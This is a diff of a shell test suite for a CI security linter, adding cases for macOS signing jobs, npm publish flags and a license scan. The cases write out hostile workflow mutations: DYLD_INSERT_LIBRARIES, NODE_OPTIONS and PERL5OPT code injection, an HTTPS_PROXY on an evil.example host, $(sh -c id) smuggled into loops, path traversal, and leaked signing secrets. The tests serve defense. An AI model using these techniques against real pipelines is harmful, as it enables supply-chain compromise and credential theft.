+	expect_caught 'the npm cache of setup-node left on in pack-brain (#1046 review)' mutable "$WORKFLOWS/release-exec.yml" \
+		$'          package-manager-cache: false\n' '' \
+		'setup-node without package-manager-cache: false'
+	expect_caught 'setup-node asked for an npm cache by name (#1046 review)' mutable "$WORKFLOWS/sidecar-release.yml" \
+		$'          package-manager-cache: false\n' $'          package-manager-cache: false\n          cache: npm\n' \
+		'or with cache:'
 	expect_caught 'Go modules and build output restored from the Actions cache' mutable "$WORKFLOWS/sidecar-release.yml" \
 		$'          cache: false\n' ''
+}
+# #870: a job holding a signing secret builds nothing, installs nothing,
+# runs no repository script and takes its input only by digest.
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	R870='in a job holding a signing secret'
+	expect_caught 'go build in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          go build -o x .\n' \
+		"sign-sidecar-darwin: builds or runs build tooling ${R870} (#870): go build"
+	expect_caught 'make dmg-installer back in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          hdiutil create -volname "Install Jarvis" -srcfolder "$APP" -format UDZO -ov "$DMG"' '          make dmg-installer' \
+		"sign-macos: builds or runs build tooling ${R870} (#870): make dmg-installer"
+	expect_caught 'clang run through xcrun in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          xcrun --sdk macosx clang -o x x.c' \
+		"sign-macos: runs xcrun other than notarytool or stapler, which can run build tooling, ${R870} (#870): xcrun --sdk macosx clang"
+	expect_caught 'swiftc in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            if' $'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            swiftc -O -o x helpers/ocr-helper.swift\n            if' \
+		"sign-sidecar-darwin: builds or runs build tooling ${R870} (#870): swiftc"
+	expect_caught 'a brew install in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          brew install coreutils\n' \
+		"sign-sidecar-darwin: installs packages ${R870} (#870): brew install coreutils"
+	expect_caught 'a repository script in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          packaging/macos/make-icns.sh\n' \
+		"sign-sidecar-darwin: runs a repository script ${R870} (#870): packaging/macos/make-icns.sh"
+	expect_caught 'shell text in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          bash -c "$X"' \
+		"sign-macos: runs shell text or sources a file ${R870}"
+	expect_caught 'setup-go in the installer signing job (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'      - name: Verify the installer app\n' $'      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          cache: false\n      - name: Verify the installer app\n' \
+		"sign-macos: uses actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e ${R870}"
+	expect_caught 'a local action in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n' $'      - uses: ./.github/actions/bun-setup\n      - name: Unpack the bundles\n' \
+		"sign-sidecar-darwin: uses ./.github/actions/bun-setup ${R870}"
+	expect_caught 'cgo switched on in the sidecar macOS signing job (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      signed: ${{ steps.applesign.outputs.ready }}\n    steps:\n      # For packaging/macos/entitlements.plist.' $'      signed: ${{ steps.applesign.outputs.ready }}\n    env:\n      CGO_ENABLED: "1"\n    steps:\n      # For packaging/macos/entitlements.plist.' \
+		"sign-sidecar-darwin: job env sets CGO_ENABLED (a Go or C build) ${R870}"
+	expect_caught 'the Apple secret back in the installer macOS build (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'  build-macos:\n    needs: resolve\n' $'  build-macos:\n    env:\n      HAVE_APPLE_SIGNING: ${{ secrets.APPLE_CERT_P12 != \'\' }}\n    needs: resolve\n' \
+		"build-macos: builds or runs build tooling ${R870} (#870): GOOS=darwin GOARCH=arm64 go build"
+	expect_caught 'the Apple secret back in a sidecar darwin build leg (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  build-sidecar-darwin-arm64:\n    needs: resolve\n' $'  build-sidecar-darwin-arm64:\n    env:\n      HAVE_APPLE_SIGNING: ${{ secrets.APPLE_CERT_P12 != \'\' }}\n    needs: resolve\n' \
+		"build-sidecar-darwin-arm64: builds or runs build tooling ${R870} (#870): ../.github/scripts/build-sidecar.sh"
+	expect_caught 'an Apple secret in the workflow env, reaching every build leg (#870)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'env:\n  # No GO_VERSION' $'env:\n  APPLE_CERT_PASSWORD: ${{ secrets.APPLE_CERT_PASSWORD }}\n  # No GO_VERSION' \
+		"build-sidecar-linux-x64: builds or runs build tooling ${R870} (#870): ../.github/scripts/build-sidecar.sh"
+	expect_caught 'the macOS signer taking the unsigned app without its digest check (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c -' '          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | cat' \
+		'sign-macos: download "unsigned-installer-darwin" is not followed at once by a sha256sum -c'
+	expect_caught 'the macOS signer checking a SHA-1 instead (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c -' '          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 1 -c -' \
+		'sign-macos: download "unsigned-installer-darwin" is not followed at once by a sha256sum -c'
+	expect_caught 'the macOS signer excusing a failed digest check (#870)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c -' '          echo "${SHA256}  ${in}/install-jarvis-app.tar.gz" | shasum -a 256 -c - || true' \
+		'sign-macos: download "unsigned-installer-darwin" is checked with a failure excused'
+	expect_caught 'a signing step run by node instead of bash (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n        run: |\n' $'      - name: Unpack the bundles\n        shell: node {0}\n        run: |\n' \
+		"sign-sidecar-darwin: step \"Unpack the bundles\" runs in shell: node {0} ${R870}"
+	expect_caught 'BASH_ENV sourcing a file before a signing step (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'      - name: Unpack the installer app\n        run: |\n' $'      - name: Unpack the installer app\n        env:\n          BASH_ENV: x\n        run: |\n' \
+		"sign-macos: step \"Unpack the installer app\" env sets BASH_ENV ${R870}"
+	expect_caught 'the dynamic loader poisoned for later signing steps through GITHUB_ENV (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          echo "DYLD_INSERT_LIBRARIES=/tmp/x.dylib" >> "$GITHUB_ENV"\n' \
+		"sign-sidecar-darwin: step \"Unpack the bundles\" writes GITHUB_ENV or GITHUB_PATH ${R870}"
+	expect_caught 'an extensionless repository program in the signing job (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          sidecar/packaging/macos/sign-helper "$APP"' \
+		"sign-macos: runs a program from a variable, a bundle or the checkout ${R870}"
+	expect_caught 'the unsigned bundle binary run as a smoke test in the signing job (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            if' $'            app="${RUNNER_TEMP}/work/${leg}/Jarvis.app"\n            "${app}/Contents/MacOS/jarvis" --version\n            if' \
+		"sign-sidecar-darwin: runs a program from a variable, a bundle or the checkout ${R870}"
+	expect_caught 'the bundle opened in the signing job (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          open "$APP"' \
+		"sign-macos: runs a program from a variable, a bundle or the checkout ${R870}"
+	expect_caught 'an Apple secret handed to a workflow off the release path (#870 review)' narrow "$WORKFLOWS/test.yml" \
+		'      - run: .github/scripts/release-exec.test.sh' $'      - run: .github/scripts/release-exec.test.sh\n        env:\n          K: ${{ secrets.ASC_API_KEY_P8 }}' \
+		"runs a program from a variable, a bundle or the checkout ${R870}"
+	expect_caught 'the macOS signer checking with shasum a digest it never held to 64 hex (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }\n' '' \
+		'is checked with shasum, which takes the algorithm from the digest length, without first holding every digest to 64 hex'
+	expect_caught 'the sidecar macOS signer holding only one leg digest to 64 hex (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'          [[ "$SHA_DARWIN_X64" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::no digest was reported for DARWIN_X64"; exit 1; }\n' '' \
+		'is checked with shasum, which takes the algorithm from the digest length, without first holding every digest to 64 hex'
+	expect_caught 'codesign pointed at another allocate helper (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'          APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}' $'          CODESIGN_ALLOCATE: x\n          APPLE_CERT_P12: ${{ secrets.APPLE_CERT_P12 }}' \
+		"sign-sidecar-darwin: step \"Sign and notarize (Developer ID)\" env sets CODESIGN_ALLOCATE ${R870}"
+	expect_caught 'xcrun pointed at another developer directory in the script (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          export DEVELOPER_DIR="${RUNNER_TEMP}/work"\n          xcrun stapler staple "$APP"' \
+		"sign-macos: step \"Sign, notarize and staple\" sets DEVELOPER_DIR in its script, ${R870}"
+	expect_caught 'bundle files run through find -exec in the signing job (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n' $'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n          find "${RUNNER_TEMP}/work" -name hook -exec {} \;\n' \
+		"sign-sidecar-darwin: runs programs through find -exec, xargs or awk system() ${R870}"
+	expect_caught 'a 64-hex hold excused with || : before shasum (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }' '          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || :' \
+		'is checked with shasum after a 64-hex hold whose failure does not stop the step'
+	expect_caught 'an Apple secret by index syntax in a workflow off the release path (#870 review)' narrow "$WORKFLOWS/test.yml" \
+		'      - run: .github/scripts/release-exec.test.sh' $'      - run: .github/scripts/release-exec.test.sh\n        env:\n          K: ${{ secrets[\'APPLE_CERT_P12\'] }}' \
+		"runs a program from a variable, a bundle or the checkout ${R870}"
+	expect_caught 'awk running a command after a semicolon in its program (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          ls | awk \'{ n++; system($0) }\'' \
+		"sign-macos: runs programs through find -exec, xargs or awk system() ${R870}"
+	expect_caught 'awk piping into a command (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          xcrun stapler staple "$APP"' $'          xcrun stapler staple "$APP"\n          ls | awk \'{ print | "sh" }\'' \
+		"sign-macos: runs programs through find -exec, xargs or awk system() ${R870}"
+	expect_caught 'PERL5OPT loading code into shasum in a signing job (#870 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'          SHA_DARWIN_ARM64: ${{ needs.build-sidecar-darwin-arm64.outputs.sha256 }}\n' $'          PERL5OPT: -Mx\n          SHA_DARWIN_ARM64: ${{ needs.build-sidecar-darwin-arm64.outputs.sha256 }}\n' \
+		"sign-sidecar-darwin: step \"Verify the bundles\" env sets PERL5OPT ${R870}"
+	expect_caught 'a 64-hex hold whose brace only echoes the word exit (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }' '          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo exit 1; }' \
+		'is checked with shasum after a 64-hex hold whose failure does not stop the step'
+	expect_caught 'a 64-hex hold whose exit sits behind true || (#870 review)' narrow "$WORKFLOWS/installer-release.yml" \
+		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-macos reported no digest"; exit 1; }' '          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { true || exit 1; }' \
+		'is checked with shasum after a 64-hex hold whose failure does not stop the step'
 }
 # shellcheck disable=SC2016 # literal workflow text, not shell.
 {
@@ -2598,7 +3700,7 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 	expect_caught 'a declared signing secret the caller does not pass (signing would silently skip)' narrow "$WORKFLOWS/release-exec.yml" \
 		$'      ASC_API_KEY_P8: ${{ secrets.ASC_API_KEY_P8 }}\n' ''
 	expect_caught 'id-token back on a sidecar build leg' narrow "$WORKFLOWS/sidecar-release.yml" \
-		$'      contents: read\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    env: &build-sidecar-leg-env' $'      contents: read\n      id-token: write\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    env: &build-sidecar-leg-env' \
+		$'      contents: read\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    # One leg.' $'      contents: read\n      id-token: write\n    outputs:\n      sha256: ${{ steps.digest.outputs.sha256 }}\n    # One leg.' \
 		'a matrix job holding id-token'
 	expect_caught 'the brain build back in the job that holds id-token' narrow "$WORKFLOWS/release-exec.yml" \
 		'      - name: Verify the tarball' $'      - run: bun run prepublishOnly\n      - name: Verify the tarball' \
@@ -2612,6 +3714,52 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 		'uses actions/checkout@'
 	expect_caught 'a directory npm publish (runs lifecycle scripts)' narrow "$WORKFLOWS/release-exec.yml" \
 		'npm publish "${RUNNER_TEMP}/brain-pack/${TARBALL}" --access public' 'npm publish --access public'
+	# #1046: each npm call that acts on a package directory in the job
+	# holding id-token, with --ignore-scripts dropped.
+	expect_caught 'a platform npm version that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm version "${VERSION}" --no-git-tag-version --allow-same-version' \
+		'publish-sidecar: runs npm version without --ignore-scripts'
+	expect_caught 'the wrapper npm version that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'\n          npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts --workspaces=false\n' $'\n          npm version "${VERSION}" --no-git-tag-version --allow-same-version --workspaces=false\n' \
+		'publish-sidecar: runs npm version without --ignore-scripts'
+	expect_caught 'a platform directory npm publish that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public "${flags[@]}"' \
+		'publish-sidecar: runs npm publish without --ignore-scripts'
+	expect_caught 'the wrapper directory npm publish that runs lifecycle scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'\n          npm publish --access public --ignore-scripts "${flags[@]}"' $'\n          npm publish --access public "${flags[@]}"' \
+		'publish-sidecar: runs npm publish without --ignore-scripts'
+	expect_caught 'npm version by an abbreviation, without --ignore-scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm vers "${VERSION}" --no-git-tag-version --allow-same-version' \
+		'publish-sidecar: runs npm vers without --ignore-scripts'
+	expect_caught 'the npm version alias verison, without --ignore-scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            cd x && npm verison "${VERSION}" --no-git-tag-version' \
+		'publish-sidecar: runs npm verison without --ignore-scripts'
+	# Security review of #1046: the flag turned off again, an option that
+	# hides the verb, and the workspace walk of npm version.
+	expect_caught 'npm publish with --ignore-scripts false (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts false "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with --ignore-scripts then --no-ignore-scripts (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ignore-scripts "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with an abbreviated --no-ignore-script (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ignore-script "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with a short --no-ign (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ign "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm publish with --ignore-script=false after the flag (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --ignore-script=false "${flags[@]}"' \
+		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
+	expect_caught 'npm version with --ignore-scripts=false (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts=false' \
+		'publish-sidecar: runs npm version with --ignore-scripts given a value or negated'
+	expect_caught 'an option with a value before the npm verb (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm --loglevel warn publish --access public "${flags[@]}"' \
+		'publish-sidecar: runs npm with an option before its command'
+	expect_caught 'npm version walking up to a workspace root (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'--allow-same-version --ignore-scripts --workspaces=false' '--allow-same-version --ignore-scripts' \
+		'publish-sidecar: runs npm version without --workspaces=false'
 	expect_caught 'the digest check removed before the publish' narrow "$WORKFLOWS/release-exec.yml" \
 		'brain-pack/${TARBALL}" | sha256sum -c -' 'brain-pack/${TARBALL}" | cat'
 	expect_caught 'another global package installed in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
@@ -2808,6 +3956,61 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 	expect_caught 'a registry login on a dry run' narrow "$WORKFLOWS/release-exec.yml" \
 		$'        if: env.DRY_RUN != \'true\'\n        uses: docker/login-action@' $'        uses: docker/login-action@'
 }
+echo
+echo "the catalog sync license-checks what the shared build would install, every week (#971)"
+expect_clean "sync-pieces-catalog.yml: one unconditional license scan of the regenerated catalog" \
+	license-scan "$WORKFLOWS/sync-pieces-catalog.yml"
+expect_caught 'the license scan removed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'        run: bun run scripts/check-piece-licenses.ts --install' '        run: echo skipped scripts/check-piece-licenses --install' \
+	'expected exactly one license scan step'
+expect_caught 'the license scan allowed to fail' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'      - name: License-check the shared pieces tree' $'      - name: License-check the shared pieces tree\n        continue-on-error: true' \
+	'may fail without failing the run'
+expect_caught 'the license scan job allowed to fail' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	$'  licenses:\n    needs: generate\n' $'  licenses:\n    needs: generate\n    continue-on-error: true\n' \
+	'may fail without failing the run'
+expect_caught 'the license scan only when the catalog changed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	$'  licenses:\n    needs: generate\n' $'  licenses:\n    needs: generate\n    if: needs.generate.outputs.has_changes == \x27true\x27\n' \
+	'is conditional'
+expect_caught 'the license scan failure swallowed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'--summary-md "$GITHUB_STEP_SUMMARY"' '--summary-md "$GITHUB_STEP_SUMMARY" || true' \
+	'runs something besides the scan'
+expect_caught 'the license scan on the committed catalog' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'        run: cp "$RUNNER_TEMP/catalog-sync/catalog-generated.ts" src/workflows/pieces-library/catalog-generated.ts' '        run: ls "$RUNNER_TEMP/catalog-sync"' \
+	'does not put the regenerated catalog in place'
+expect_caught 'the license scan failure swallowed with an echo' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'--summary-md "$GITHUB_STEP_SUMMARY"' '--summary-md "$GITHUB_STEP_SUMMARY" || echo failed' \
+	'runs something besides the scan'
+expect_caught 'the license scan behind an earlier command that ends the step' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'        run: bun run scripts/check-piece-licenses.ts --install' '        run: true || bun run scripts/check-piece-licenses.ts --install' \
+	'runs something besides the scan'
+expect_caught 'the regenerated catalog put in place only sometimes' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'      - name: Use the regenerated catalog' $'      - name: Use the regenerated catalog\n        if: false' \
+	'putting the regenerated catalog in place is conditional'
+expect_caught 'the regenerated catalog put in place allowed to fail' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'      - name: Use the regenerated catalog' $'      - name: Use the regenerated catalog\n        continue-on-error: true' \
+	'putting the regenerated catalog in place may fail'
+expect_caught 'the regenerated catalog copy with its failure swallowed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'src/workflows/pieces-library/catalog-generated.ts
+
+      # Installs' 'src/workflows/pieces-library/catalog-generated.ts || true
+
+      # Installs' \
+	'runs something besides the copy'
+expect_caught 'the regenerated catalog put in place after the scan' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	$'      - name: Use the regenerated catalog\n        run: cp "$RUNNER_TEMP/catalog-sync/catalog-generated.ts" src/workflows/pieces-library/catalog-generated.ts\n\n      # Installs into a fresh directory, the way scripts/build-shared-runtime.ts\n      # installs the hosted tree, then applies the same gate. Exit 1 names\n      # every denied package and the chain that installed it.\n      - name: License-check the shared pieces tree\n        run: bun run scripts/check-piece-licenses.ts --install "$RUNNER_TEMP/license-scan" --summary-md "$GITHUB_STEP_SUMMARY"\n' \
+	$'      - name: License-check the shared pieces tree\n        run: bun run scripts/check-piece-licenses.ts --install "$RUNNER_TEMP/license-scan" --summary-md "$GITHUB_STEP_SUMMARY"\n      - name: Use the regenerated catalog\n        run: cp "$RUNNER_TEMP/catalog-sync/catalog-generated.ts" src/workflows/pieces-library/catalog-generated.ts\n' \
+	'does not put the regenerated catalog in place first'
+expect_caught 'the generated catalog downloaded only sometimes' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	$'      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: catalog-sync\n          path: ${{ runner.temp }}/catalog-sync\n\n      - name: Use the regenerated catalog' \
+	$'      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        if: false\n        with:\n          name: catalog-sync\n          path: ${{ runner.temp }}/catalog-sync\n\n      - name: Use the regenerated catalog' \
+	'downloading the generated catalog is conditional'
+expect_caught 'the license scan scanning without installing' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'check-piece-licenses.ts --install' 'check-piece-licenses.ts --dir' \
+	'does not install the catalog'
+expect_caught 'the license scan run from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
+	'      - name: Update or close the review issue' $'      - run: echo go; scripts/check-piece-licenses.ts --dir x\n      - name: Update or close the review issue' \
+	'processes third-party data in a job holding'
 expect_caught 'an unfrozen install in the catalog sync' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
 	'run: bun install --frozen-lockfile' 'run: bun install'
 expect_caught 'a write scope on the job that runs the catalog generator' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
@@ -3004,7 +4207,7 @@ echo "no env in a job holding id-token names code to run first, and no step writ
 		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          export HTTPS_PROXY=http://proxy.evil.example:3128\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
 		'publish-brain: step Publish to npm sets HTTPS_PROXY in its script, in a job holding id-token'
 	expect_caught 'NODE_OPTIONS in front of the publish command (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
-		'            npm publish --access public "${flags[@]}" 2>&1 | tee "$err"' '            NODE_OPTIONS=--require=/tmp/x.js npm publish --access public "${flags[@]}" 2>&1 | tee "$err"' \
+		'            npm publish --access public --ignore-scripts "${flags[@]}" 2>&1 | tee "$err"' '            NODE_OPTIONS=--require=/tmp/x.js npm publish --access public --ignore-scripts "${flags[@]}" 2>&1 | tee "$err"' \
 		'publish-sidecar: step Publish platform packages sets NODE_OPTIONS in its script, in a job holding id-token'
 	expect_caught 'a relative TMPDIR for the npm publish job (#1000 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
 		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      TMPDIR: git+https:/evil.example/r\n    # Same requirement' \
@@ -3054,12 +4257,12 @@ echo "no env in the job that installs npm and packs the brain tarball names code
 }
 
 echo
-echo "the npm publishing jobs, and every job holding id-token, run only the commands listed for them (#1029)"
+echo "the npm publishing jobs, every job holding id-token, and the macOS signers run only the commands listed for them (#1029, #870)"
 for f in "$WORKFLOWS"/*.yml; do
 	expect_clean "$(basename "$f"): every job holding id-token runs only its listed commands" runs "$f"
 done
 # Both jobs were read, or the list matched nothing and passed for that.
-for spec in "release-exec.yml publish-brain" "sidecar-release.yml publish-sidecar" "sidecar-release.yml sign-sidecar-windows" "installer-release.yml sign-windows"; do
+for spec in "release-exec.yml publish-brain" "sidecar-release.yml publish-sidecar" "sidecar-release.yml sign-sidecar-windows" "installer-release.yml sign-windows" "sidecar-release.yml sign-sidecar-darwin" "installer-release.yml sign-macos"; do
 	read -r f j <<<"$spec"
 	if RUNS_REPORT=1 check runs "$WORKFLOWS/$f" | grep -qxF "checked $j"; then
 		ok "the run allowlist read ${j} in ${f} (#1029)"
@@ -3140,10 +4343,10 @@ done
 		'      - name: Record artifact digests' $'      - run: printf -v PATH %s /tmp/evil\n      - name: Record artifact digests' \
 		'runs printf -v, which sets a variable this rule cannot see'
 	expect_caught 'a directory outside sidecar/npm in the platform loop (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
-		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		$'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' $'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' \
 		'publish-sidecar: step Prepare platform packages loops over platform in ../../../evil darwin-arm64'
 	expect_caught 'a command inside a for list (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
-		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		$'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' $'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do\n            pkg_dir=' \
 		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
 	expect_caught 'a command inside a case pattern (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
 		'              darwin-*)' '              darwin-*|$(sh -c id))' \
@@ -3200,6 +4403,33 @@ done
 	expect_caught 'another publishing job, npm quoted (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
 		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: \x27"npm" publish x.tgz\x27\n' \
 		'sneak: holds id-token and has no list of the commands it may run'
+	# #870 review: the macOS signers run only their listed commands; each of
+	# these passed the narrow deny list.
+	SDU=$'      - name: Unpack the bundles\n        run: |\n          set -euo pipefail\n'
+	expect_caught 'bash running a repository file in the macOS signer (#870 review)' runs "$WORKFLOWS/sidecar-release.yml" \
